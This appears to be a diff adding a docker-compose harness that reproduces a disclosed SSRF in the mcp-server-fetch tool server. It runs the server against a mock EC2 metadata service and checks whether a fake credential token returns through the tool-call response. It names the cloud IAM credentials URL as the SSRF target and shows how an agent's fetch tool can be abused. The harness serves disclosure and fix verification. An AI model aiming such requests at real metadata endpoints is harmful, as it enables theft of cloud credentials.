@@ -1,0 +1,53 @@
+# SSRF PoC harness — end-to-end reproduction of the mcp-server-fetch
+# SSRF disclosed at modelcontextprotocol/servers#4143 and fixed in PR #4226.
+#
+# Two containers on a custom 169.254.0.0/16 network that lets the IMDS
+# mock claim the canonical EC2 metadata IP 169.254.169.254 internally.
+# The attacker container runs mcp-server-fetch v2025.4.7 (pre-fix) as
+# a stdio subprocess and drives a tool-call against the mock IMDS
+# endpoint. Vulnerable behavior is confirmed when the fake AKIA token
+# flows back through the JSON-RPC tools/call response.
+#
+# To verify the fix instead:
+#   MCP_FETCH_VERSION=<post-fix-version> docker compose up --build
+# The attacker's exit code distinguishes vulnerable, fix-verified, and
+# unexpected outcomes (see attacker/attack.py for the exit-code map).
+
+networks:
+  metadata-net:
+    driver: bridge
+    ipam:
+      driver: default
+      config:
+        - subnet: 169.254.0.0/16
+          gateway: 169.254.0.1
+
+services:
+  imds:
+    build: ./imds
+    container_name: ssrf-poc-imds
+    networks:
+      metadata-net:
+        ipv4_address: 169.254.169.254
+    healthcheck:
+      test: ["CMD", "python", "-c", "import urllib.request; urllib.request.urlopen('http://127.0.0.1:80/latest/meta-data/instance-id', timeout=1)"]
+      interval: 1s
+      timeout: 2s
+      retries: 15
+      start_period: 1s
+
+  attacker:
+    build:
+      context: ./attacker
+      args:
+        MCP_FETCH_VERSION: ${MCP_FETCH_VERSION:-2025.4.7}
+    container_name: ssrf-poc-attacker
+    networks:
+      - metadata-net
+    depends_on:
+      imds:
+        condition: service_healthy
+    environment:
+      IMDS_URL: "http://169.254.169.254/latest/meta-data/iam/security-credentials/poc-demo-role"
+      MCP_FETCH_VERSION: ${MCP_FETCH_VERSION:-2025.4.7}
+    command: ["python", "attack.py"]
